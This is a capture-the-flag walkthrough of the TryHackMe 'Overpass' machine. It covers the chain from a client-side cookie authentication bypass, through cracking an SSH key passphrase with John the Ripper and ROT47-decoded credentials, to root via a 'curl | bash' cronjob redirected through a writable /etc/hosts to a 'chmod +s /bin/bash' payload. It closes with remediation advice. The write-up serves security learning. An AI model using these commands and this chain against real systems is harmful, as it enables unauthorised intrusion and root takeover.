# 🖥️ TryHackMe — Overpass Walkthrough (Summary)

This room demonstrates the exploitation of a vulnerable Linux host through a chain of weaknesses involving Broken Access Control, insecure client-side authentication logic, weak cryptographic protection, and dangerous infrastructure misconfigurations that ultimately lead to full root compromise.

The machine highlights how small security oversights can compound into complete system takeover when authentication, filesystem permissions, and automated privileged processes are improperly secured.

---

## 🔍 Core Vulnerability Categories

The exploitation chain relies on several critical security flaws:

- **Broken Access Control:** Authentication enforced entirely client-side.
- **Weak Cryptography:** Sensitive credentials protected using reversible encoding (ROT47).
- **Source Code Disclosure:** Internal application files exposed through public directories.
- **Credential Reuse & Password Weaknesses:** SSH passphrase vulnerable to dictionary attacks.
- **Privilege Escalation via Cronjobs:** Root-owned automated tasks executing remote scripts over HTTP.
- **Writable System Files:** Improper permissions on `/etc/hosts` enabling DNS hijacking attacks.

---

## 🧭 Phase 1 — Reconnaissance & Enumeration

### 1. Network Enumeration

Initial enumeration identified two exposed services:

| Port | Service | Description |
| :--- | :--- | :--- |
| `22/tcp` | OpenSSH 7.6p1 | Remote shell access |
| `80/tcp` | Golang `net/http` | Web application hosting the Overpass portal |

---

### 2. Directory Enumeration

Using directory brute-forcing tools such as `gobuster`, two important paths were discovered:

| Path | Discovery |
| :--- | :--- |
| `/downloads` | Publicly accessible application files |
| `/admin` | Restricted administration portal |

---

### 3. Source Code Disclosure

The `/downloads` directory exposed internal application resources including:

- `overpass.go`
- Build scripts
- Compiled binaries
- Client-side authentication logic

Reviewing the JavaScript source revealed a fatal authentication flaw:

```javascript
if (Cookies.get("SessionToken")) {
    window.location.href = "/admin";
}
```

### Security Impact

The application only checked whether a cookie existed — not whether it was cryptographically valid or verified server-side.

This resulted in complete authentication bypass.

---

## 🔓 Phase 2 — Authentication Bypass & Initial Access

### 1. Client-Side Authentication Bypass

Because authentication relied entirely on client-side JavaScript logic, access to the administrator portal could be obtained simply by creating the expected cookie manually.

---

### Exploitation

Using the browser developer console:

```javascript
Cookies.set("SessionToken", "AnyValueString");
```

After refreshing the page:

- Administrative access was granted.
- Sensitive administrator data became visible.
- An encrypted RSA private SSH key was exposed.

---

## 🔑 SSH Key Passphrase Cracking

The retrieved private key was protected by a passphrase.

The attack workflow involved:

### Step 1 — Convert SSH Key to Crackable Format

```bash
ssh2john id_rsa > id_rsa.hash
```

---

### Step 2 — Dictionary Attack with John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

---

### Result

- The SSH passphrase was successfully cracked.
- SSH access to the target machine was obtained.
- The `user.txt` flag was recovered.

---

## 🚀 Phase 3 — Privilege Escalation

### 1. Local Enumeration

Post-exploitation enumeration revealed multiple privilege escalation vectors.

---

## 🔐 Credential Recovery via ROT47

A hidden file named `.overpass` contained data encoded using ROT47.

After decoding, plaintext credentials for the local user account were recovered.

### Security Weakness

ROT47 is not encryption — it is a reversible character substitution encoding and provides no meaningful security.

---

## 🔎 Automated Enumeration with LinPEAS

Running `linpeas.sh` identified two critical system misconfigurations:

| Vulnerability | Security Risk |
| :--- | :--- |
| Writable `/etc/hosts` | Local DNS hijacking |
| Root cronjob fetching remote scripts | Arbitrary root code execution |

---

## ⚠️ Dangerous Root Cronjob

A root-owned cronjob executed every minute:

```bash
curl -s http://overpass.thm/downloads/src/buildscript.sh | bash
```

### Security Impact

The cronjob:
- Downloaded scripts over insecure HTTP
- Trusted remote content blindly
- Executed attacker-controlled code as root

This created a direct remote privilege escalation vector.

---

## 🧨 Phase 4 — Root Exploitation (DNS Hijacking + SUID Abuse)

The final attack chain abused writable DNS resolution combined with remote script execution.

---

## 📋 Exploitation Workflow

| Step | Technical Action | Objective |
| :--- | :--- | :--- |
| Step 1 | Modify `/etc/hosts` to point `overpass.thm` to attacker IP | Redirect root cronjob traffic |
| Step 2 | Recreate `/downloads/src/` on attacker machine | Match expected remote path |
| Step 3 | Create malicious `buildscript.sh` | Deliver root payload |
| Step 4 | Host payload using Python HTTP server | Serve malicious script |
| Step 5 | Wait for cron execution and launch `/bin/bash -p` | Spawn persistent root shell |

---

## 🧪 Malicious Payload

```bash
chmod +s /bin/bash
```

### Purpose

The payload assigned the SUID bit to `/bin/bash`, allowing privileged shell execution.

---

## 🌐 Hosting the Malicious Script

```bash
python3 -m http.server 80
```

Once the cronjob executed the malicious script:

```bash
/bin/bash -p
```

Resulted in:
- Persistent root shell access
- Full system compromise
- Retrieval of `root.txt`

---

## ⚠️ Security Impact Summary

This machine demonstrates how multiple low-to-medium severity flaws can combine into full root compromise:

- Client-side authentication enforcement
- Public source code exposure
- Weak credential protection
- Insecure automation pipelines
- Writable critical system files
- Unsafe privileged cronjobs

---

## 🛡️ Remediation & Defensive Security Baselines

### Enforce Server-Side Authentication

Applications must:
- Validate sessions server-side
- Cryptographically verify tokens
- Reject arbitrary client-controlled cookies

Client-side checks must never enforce authorization.

---

### Restrict Sensitive File Exposure

Public web directories should never expose:
- Source code
- Build scripts
- Private binaries
- SSH keys

---

### Harden System Permissions

Critical system files such as `/etc/hosts` must remain writable only by privileged administrators.

Recommended permissions:

```bash
chmod 644 /etc/hosts
```

---

### Secure Scheduled Tasks

Root cronjobs must never:
- Download remote scripts over HTTP
- Execute untrusted external content
- Trust mutable infrastructure paths

Use:
- Local static scripts
- HTTPS with certificate validation
- Integrity checksum verification

---

### Protect Sensitive Credentials Properly

Avoid weak reversible encodings such as:
- ROT47
- Base64
- Caesar Cipher variants

Use:
- Strong hashing
- Secure credential vaults
- Proper encryption mechanisms

---

## 📊 Key Takeaways

- Authentication logic must always be enforced server-side.
- Public source code disclosure significantly accelerates exploitation.
- Weak cryptographic obfuscation is not security.
- Writable infrastructure configuration files create severe escalation paths.
- Automated privileged tasks are high-value attack surfaces.
- Chained vulnerabilities frequently result in full system compromise.

---

## 🧠 Final Summary

The Overpass room demonstrates a complete attack chain beginning with reconnaissance and ending in full root compromise through layered exploitation techniques.

By abusing client-side authentication flaws, extracting sensitive source code, cracking weak SSH credentials, decoding improperly protected secrets, and hijacking an insecure root cronjob via DNS manipulation, attackers can escalate from unauthenticated access to complete administrative control of the system.

The room strongly reinforces the importance of secure authentication design, filesystem hardening, proper privilege separation, and safe automation practices in Linux environments.

---

**Status: 🏁 Completed**